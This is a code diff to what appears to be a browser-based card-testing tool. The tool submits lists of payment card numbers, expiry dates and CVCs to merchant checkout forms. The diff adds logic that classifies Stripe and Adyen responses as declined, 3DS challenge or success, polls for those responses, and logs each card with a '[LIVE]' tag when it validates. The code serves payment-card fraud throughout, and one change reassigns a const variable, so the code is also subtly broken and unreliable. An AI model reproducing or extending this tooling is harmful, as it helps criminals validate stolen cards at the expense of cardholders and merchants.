@@ -361,19 +361,37 @@
       const j = JSON.parse(body);
       if (!j || typeof j !== "object") return null;
       const err = j.error || null;
-      const pi = j.payment_intent || j.intent || j.setup_intent || null;
+      const lpe = j.last_payment_error || (j.payment_intent && j.payment_intent.last_payment_error) || (j.intent && j.intent.last_payment_error) || null;
+      const pi = j.payment_intent || j.intent || (j.object === "payment_intent" ? j : null) || null;
+      const si = pi ? null : (j.setup_intent || (j.object === "setup_intent" ? j : null) || null);
       const out = {};
-      out.message = (err && err.message) || "";
-      out.decline = (err && err.decline_code) || "";
-      out.code = (err && err.code) || "";
-      out.status = (pi && pi.status) || j.status || "";
-      out.action = (pi && pi.next_action && pi.next_action.type) || "";
+      out.message = (err && err.message) || (lpe && lpe.message) || "";
+      out.decline = (err && err.decline_code) || (lpe && lpe.decline_code) || "";
+      out.code = (err && err.code) || (lpe && lpe.code) || "";
+      out.status = (pi && pi.status) || (si && si.status) || j.status || "";
+      out.action = (pi && pi.next_action && pi.next_action.type) || (si && si.next_action && si.next_action.type) || "";
       out.redirect = (pi && pi.next_action && pi.next_action.redirect_to_url && pi.next_action.redirect_to_url.url) || "";
-      if (!out.message && !out.decline && !out.status && !out.action && !out.redirect) return null;
+      if (!out.message && !out.decline && !out.code && !out.status && !out.action && !out.redirect) return null;
       return out;
     } catch (e) {
       return null;
     }
+  }
+
+  function stripeVerdict(info) {
+    if (!info) return null;
+    const status = (info.status || "").toLowerCase();
+    const action = (info.action || "").toLowerCase();
+    if (info.decline || info.code) return { ok: false, label: "DECLINED " + (info.decline || info.code) + (info.message ? " | " + info.message : "") };
+    if (/^succeeded$|^processing$/.test(status)) return { ok: true, label: (info.message || status.toUpperCase()) };
+    if (action === "redirect_to_url" || info.redirect) return { ok: true, label: "REDIRECT" };
+    if (/requires_action|await_payment_method/.test(status) || /requires_action|3ds|challenge/.test(action)) return { ok: true, label: "3DS CHALLENGE" };
+    if (/requires_payment_method|requires_capture/.test(status) && !/error|declin/.test(status)) {
+      return { ok: /requires_capture/.test(status), label: (/requires_capture/.test(status) ? "REQUIRES_CAPTURE" : "DECLINED (SOFT)") };
+    }
+    if (/canceled|cancelled|requires_confirmation/.test(status)) return { ok: false, label: "CANCELED" };
+    if (info.message) return { ok: /succeed|success|process|approve|verified|complete/.test(info.message.toLowerCase()), label: info.message.trim() };
+    return null;
   }
 
   function randomEmail() {
@@ -1147,7 +1165,7 @@
     }
     const good = [
       "thank you", "payment successful", "payment complete", "approved", "authorised", "authorized",
-      "processing", "redirecting", "almost done", "your payment was made",
+      "redirecting", "your payment was made",
       "payment succeeded", "success", "payment received",
       "thanks for your purchase", "your purchase has been completed", "payment complete"
     ];
@@ -2228,18 +2246,23 @@
       }
 
       const resp = lastRespSince(hitStart);
-      if (!resp) await settleResultText(2600);
       let respInfo = null;
       let respProvider = "";
-      if (resp) {
-        const sp = parseStripeResp(resp.body);
-        if (sp) {
-          respInfo = sp;
-          respProvider = "stripe";
-        } else {
-          respInfo = parseAdyenResp(resp.body);
+      if (st.any && submitted) {
+        const deadline = Date.now() + 6000;
+        while (Date.now() < deadline && !stopRequested) {
+          const r = lastRespSince(hitStart);
+          if (r) {
+            const sp = parseStripeResp(r.body);
+            if (sp) { resp = r; respInfo = sp; respProvider = "stripe"; break; }
+            const ap = parseAdyenResp(r.body);
+            if (ap) { resp = r; respInfo = ap; respProvider = "adyen"; break; }
+          }
+          await sleep(400);
         }
       }
+      if (!respInfo) await settleResultText(3000);
+      resp = resp || lastRespSince(hitStart);
 
       const dtTick = Date.now() + Math.floor(Math.random() * 1000);
       currentTick = dtTick;
@@ -2248,26 +2271,16 @@
       const dt = await waitReports("nono_dt", 800, 4000);
 
       let res = detectResult(dt.texts);
-      if (respInfo) {
-        if (respProvider === "stripe") {
-          const status = (respInfo.status || "").toLowerCase();
-          const action = (respInfo.action || "").toLowerCase();
-          const isGood = /succeeded|processing|requires_action|redirect/.test(status + action) ||
-            /\bredirect\b/.test(respInfo.redirect);
-          res = {
-            ok: isGood,
-            label: (respInfo.decline ? respInfo.decline + " | " : "") +
-              (respInfo.message || respInfo.status || respInfo.action || "RESP")
-          };
-        } else {
-          const code = (respInfo.resultCode || respInfo.action || "").toLowerCase();
-          const isGood = /authorised|pending|redirectshopper|challenge|threeds|: challenge|otp|await/.test(code);
-          res = {
-            ok: isGood,
-            label: "API " + (respInfo.resultCode || respInfo.action || "?") +
-              (respInfo.refusalReason ? " | " + respInfo.refusalReason : "")
-          };
-        }
+      if (respInfo && respProvider === "stripe") {
+        const v = stripeVerdict(respInfo);
+        if (v) res = v;
+      } else if (respInfo) {
+        const code = (respInfo.resultCode || respInfo.action || "").toLowerCase();
+        res = {
+          ok: /authorised|pending|redirectshopper|challenge|threeds|: challenge|otp|await/.test(code),
+          label: "API " + (respInfo.resultCode || respInfo.action || "?") +
+            (respInfo.refusalReason ? " | " + respInfo.refusalReason : "")
+        };
       }
       if (!res) {
         if (!st.any) res = { ok: false, label: "FIELDS NOT FOUND" };
@@ -2278,7 +2291,7 @@
       pushLog("CARD " + card.number + " " + (card.month || "??") + "/" + (card.year || "????") + " cvc " + (card.cvc || "?") + (card.zip ? " zip " + card.zip : "") + " -> " + res.label + (res.ok ? " [LIVE]" : ""));
       if (resp && resp.body) {
         const body = String(resp.body);
-        if (body.length > 4) pushLog("RESP " + (respProvider || "?") + " " + (resp.status || "") + " " + body.slice(0, 600));
+        if (body.length > 4) pushLog("RESP " + (respProvider || "?") + " " + (resp.status || "") + " " + body.slice(0, 800));
       }
 
       window.__nonoUpdate && window.__nonoUpdate();
